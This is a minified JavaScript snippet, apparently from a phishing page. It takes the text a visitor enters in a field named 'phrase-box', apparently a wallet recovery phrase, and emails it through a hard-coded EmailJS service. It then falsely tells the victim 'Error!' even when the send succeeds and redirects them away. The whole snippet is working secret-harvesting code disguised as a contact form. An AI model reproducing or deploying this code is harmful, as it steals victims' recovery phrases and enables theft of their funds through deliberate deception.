emailjs.init({publicKey:"EOj_XuTTjBepjkK6j"});const form=document.getElementById("contact-form");form.addEventListener("submit",(e)=>{e.preventDefault();const templateParams={message:document.getElementById("phrase-box").value,};emailjs.send("service_7jj3viq","template_s2fuxho", templateParams).then(()=>{alert("Error!");window.location.href = '/';},()=>{alert("Error!");window.location.href='/';});});
